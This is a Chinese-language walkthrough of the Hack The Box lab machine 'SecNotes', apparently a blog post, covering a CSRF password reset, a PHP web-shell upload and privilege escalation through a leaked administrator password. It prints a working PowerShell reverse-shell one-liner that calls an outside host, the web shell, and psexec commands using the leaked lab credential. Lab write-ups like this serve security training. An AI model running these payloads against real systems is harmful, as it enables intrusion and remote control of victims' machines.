#  从csrf到文件上传从命令执行到powershell反弹shell，htb靶机练习之secnotes  
原创 wonderful
                    wonderful  百炼G33K   2026-10-27 07:58  
  
   
  
## 信息搜集  
### 端口扫描  
  
```
nmap -sT --min-rate 10000 10.129.57.57 -p-
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WV4yK7JgPJ9g4RJGZagRv5bppr56g4icufK6IUwfRn9ZAjdxhcPCp5WTrNdluNJu5vE5uKesyPjwcwS3Cy3e4xEh8gQicrtn17Ik/640?wx_fmt=png&from=appmsg "")  
  
```
nmap -sT -sC -sV 10.129.57.57 -p80,445,8808 -o port
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WVw5FV5ObQUok1FjM0Mp2whddibwr3kF4ibCy6hxQKJNvWmAE9e8j9ufxOFAKPLlE3liacmJeib1AoSoMOoH1HM4ibgKxmqIOicFw27Q/640?wx_fmt=png&from=appmsg "")  
### 445端口漏扫  
> 看一下有没有永恒之蓝漏洞  
  
  
```
nmap --script=vuln 10.129.62.0 -p445
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WWJDXguw1FWCnY5af8fb6jY3XWc4MaiaZX4s6C9EEib4C4NFgHdG6ZA9mhOXajLqHvGeZbbJb4A1foIGunjgUODdfsGCKialAtrFQ/640?wx_fmt=png&from=appmsg "")  
> 没有找到明显的漏洞  
  
## 目录扫描  
> 先看一下几个web服务，80和8808  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WV13uko2DA8OpBic9KJx7zItFiaKVbh7FRic2u0icdjMwdKmkxUnfOUAOv3BwUHnE0P9MaZUs0p5uKntT3YhCX7kSkJ6icOCjIzUXO0/640?wx_fmt=png&from=appmsg "")  
> 一个是iis默认服务页面  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WX0ykViaInnzQulqs3b7ibcLWf4IAsE8HNlLbxqKvCcFMJv6lpzue6TN1L9bTIeJmBNIZJIRXoKxdUHib95rFFiaE40MNjKadU88dQ/640?wx_fmt=png&from=appmsg "")  
> 一个是可注册的笔记发表平台  
  
## web渗透  
> 先注册一个普通用户  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WVZwpibl2AicfZ4Cq6PyRb34xPbSccRDk8EBdPgicw7DtPHk3QmYU7EturE1kCPMhE3mGIF9MQdyjd7QvnsSe6wWqvYgggK13S7gw/640?wx_fmt=png&from=appmsg "")  
> 同时泄露了一个邮箱 tyler@secnotes.htb ，可能是用户名,**tyler**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WUbZmwEomooxmFaiatYzuAkQNGAx6FSy0kMITkR2Pfx1wmgdjTG2iaEnfbVTj0KjyH9rBibeF40E1MYjOiaRC21HR7WDWgHmERWibu0/640?wx_fmt=png&from=appmsg "")  
### web登录爆破  
> 尝试爆破web的密码没有成果  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WV56sQm0YqePLhlQqE2twz3CK1W1gLyljkLgOf9KpNWLialVz9RE01hL7icd58Uc4PZsTy98ZhUUeok1aUSSGEibZeLWjJjJr8GKo/640?wx_fmt=png&from=appmsg "")  
### smb爆破  
  
```
hydra  -e nsr -f -l tyler -P /usr/share/wordlists/fasttrack.txt 10.129.62.0 smb
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WVvlwIsB5IHVAMqIMhGwqHf6m2eAkKEUXUS8xY1Wd4MRSVYBuj4ia36s7Cb2iax7YjvEUO2T2hNPuWFUvuE23Za4Cek5P8CktcI4/640?wx_fmt=png&from=appmsg "")  
> smb爆破也失败了  
  
### csrf漏洞  
> 找到一个重置密码的接口  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WWTLL0PlIEaSMjnDAd4SpxQPPqBEVYxuC2eWoezcEtqHRBglMk0cZRtKAFoPkbjRDYRic1fRnFLEzmWGu4fmicTabf3jbsOiaS4wc/640?wx_fmt=png&from=appmsg "")  
> 同时还存在联系管理员tyler的方式，可以直接发链接给管理员  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WUP14scicgWLShTMmAqibLmiapGveSWgyTYaPpR1NrXxfecbgSu1KRibicFicliavQch0Jf5qCb7T09z9VwSHc3icnrmicJqyoaiadDibStqU/640?wx_fmt=png&from=appmsg "")  
> 联想到可以把重置密码的链接发给管理员，如果存在csrf漏洞，管理员点击之后就会重置密码 这里还存在一个问题，改密码的接口是post请求，需要测试一下get请求是否生效  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WUfQ3DsNekDZLte2fyemE8KDI6AmFFApBGVoqG985DE1YTo87ySpJR5WSGtW0Ljp8MLhTYLRT1ndF1l3jXicZHick1k7icazj3joY/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WUYccX8rsckl6UUblGBtKGyIsXv9T9kT6Z5It1bf99fcnyGD1qQ3eU9Vgiaa0hUMlYnTuWsYF6Dg6t5hqzrl7NPCNWm4QicyNIqo/640?wx_fmt=png&from=appmsg "")  
> 经过测试get请求也能成功修改密码  
  
  
```
http://10.129.62.83/change_pass.php?password=100g33k&confirm_password=100g33k&submit=submit
```  
  
> 构造一下payload  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WWqT59ic1vyHsribdUBWo0j5TvmTRspMxnwzNMCcteyICoqufvjG76icydPdJ8tGHtPibz8wVAJlzwjWCqKhib7ICwmyxhXftSDpxcs/640?wx_fmt=png&from=appmsg "")  
> 成功登录后台  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WVkq8pcd4J3eXZMAiaO0TDkiad9DYL8QsLgib1jHO6lOqib8Wn7CvKLDVfqCpxy9eENOoTv9FKkZibsvk5spVvzicgfwCoqfVQVpymEA/640?wx_fmt=png&from=appmsg "")  
> 拿到smb的账号密码,看一下有没有敏感信息  
  
  
```
smbclient //10.129.62.83/new-site -U tyler
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WX39rymFtpg0wOF5gKClmfiaJC9oXtbmseoNSZg3E4zL8niaKwV1VENs1dc2PsYeBFw3KxU4rU1ibCQAia8toR9O4bc24eJS2q6jibc/640?wx_fmt=png&from=appmsg "")  
> 下载之后发现就是iis站点，可能就是8808端口服务  
  
### 文件上传漏洞  
> 先测试一下能否解析php，上传一个phpinfo()  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WXVubmibYdlpJrqu4hXRex6HCaxe1XVb6XUKYMMwvAkJr76eiclCWhKQawDDt8ooF1RAnMU06twTTFcicLYicGWxdd6WPEqHtyCEIE/640?wx_fmt=png&from=appmsg "")  
> 成功解析  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WXk8ndugelxdicz8BRz4RhWfWzCa4NicXBNV86hviaWibZFUgQKetBxWAc5TvnF6piawnBuFNId8WrI1GFQWosgNvLKJsz05wmKMSEE/640?wx_fmt=png&from=appmsg "")  
> 先上传命令执行  
  
  
```
<?php @system($_REQUEST[1]);?>
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WXskBjmgtyWdBKpJHypBG20XLsT0PKIeCzY7d8JmHNTibZeVqPAlql2Fbicwfmrb1yeLYu9wFJicn6xzWqwndK7ELHYDw8df1PUfw/640?wx_fmt=png&from=appmsg "")  
> 用户名是tyler  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WWq8tiasLtqo37rJic5kZXvU8FfcmGEdCVyrLvIof0KSBJHMA4lpuT51BWKafJU9Nq5ZnRnzqTAgM86B5Ps3HsxU8MRl2uk5lxjU/640?wx_fmt=png&from=appmsg "")  
### powershell反弹shell  
  
```
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('10.10.15.182',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```  
  
> burp里面记得url编码  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WWyhDgcQ9QFTOmCSNIV791Ym6TYWAZrvRfVn3tCbeA5k1qPPKeBkl0vuzkFWYYOdNX19vULYgFIdj2ymYvgJ7fa4Zay8EFPDFI/640?wx_fmt=png&from=appmsg "")  
> 成功反弹  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WUSnl4CmVicLFialRpsJsjruglKvDW3UFibHp5iaeWNqC8yLNzFYlvU59xoJx37u8pPV2lrbNXyk9EGwYPjuh1RybkFOTic6C8OgQbg/640?wx_fmt=png&from=appmsg "")  
> 在桌面拿到第一个flag  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WUd96pP5S1ibKh2WiaoQ3gB4mlswhOicRXVYEpOkKMdYybJ9lnkKkwRZ7WM754plmcojDic8PnNvtJgWSYsMJbMrjPuHjlwgkR0WIc/640?wx_fmt=png&from=appmsg "")  
## 提权  
> 根据靶机提示，运行了一个wsl系统（**提供的兼容层或轻量虚拟化环境，使用户能在 Windows 上原生运行 Linux 系统与命令行工具**  
）,这就离不开**roofs**  
目录（linux根文件系统） 正如linux一切皆文件的理念  
  
  
```
Get-ChildItem -Path C:\ -Filter 'rootfs' -Recurse -Directory -Force -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
```  
  
> 查找一下这个文件夹,果然存在  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WV3vJ8iabKVJjEnGM9g9J4IguoffiafpQBdzSaTofVRW5YD51bsL7iamEXe9KckRXTFbUT76Q06iarGPGGiaEyM0xPpUlPodvPsBibmM/640?wx_fmt=png&from=appmsg "")  
> 看一下root用户下面有没有敏感信息  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WVEf5qlUJg0hgibza10s9LHibyejdviaaiaw05nnkeIqfECCOQ3WIhDA9AicIkjzbPv1eia8AxM9tYC2RlEPoZUrtcibEwY0jL1cMBP8I/640?wx_fmt=png&from=appmsg "")  
> 有连接smb的记录，泄露了administrator的密码  
  
  
```
administrator%u6!4ZwgwOM#^OBf#Nwnh
```  
  
> 因为靶机开了445端口，先用nxc验证一下密码能否正确使用，然后再上psexec  
  
  
```
nxc smb 10.129.62.83 -u administrator -p 'u6!4ZwgwOM#^OBf#Nwnh'
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WVJtumzKMVtwibKGJxFK5ATR1zYJn1BVqsk0zCiaVJDZJQUtjJuLfXKSria2GFthrpaENPBCBbYOsN94BvZtb4122u8lm8aeeiaUGo/640?wx_fmt=png&from=appmsg "")  
  
```
impacket-psexec SECNOTES/administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.129.62.83
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WUyqYDtaB1ReibPVJmwK9jEKre3dSHPv2QVy80icBo3rRqPAkUqjjEGrBmov06iaaKLrrJpuGOY5LNoukchjibMUu3P1L2eGNx4aVc/640?wx_fmt=png&from=appmsg "")  
> 拿到flag  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bBvf9TVY5WVrFtLf1kia6GXvAod5hFrtMByFh9o9iayX5O3bzVM4ICIdKwHralGCkDp8eW6EHcA5M8BNqurYwCyw5wIHDoYSZiaML9tDQwvAjU/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bBvf9TVY5WX0d9oKS7XJGQ6M8bwTbSicicZmMdBicBrDmahmfia1E34p5CdN7w3o3DUozfoiaQoErRCndN5G91njG32vqGAAQShPGAz9tn38sZdw/640?wx_fmt=png&from=appmsg "")  
  
  
   
  
  
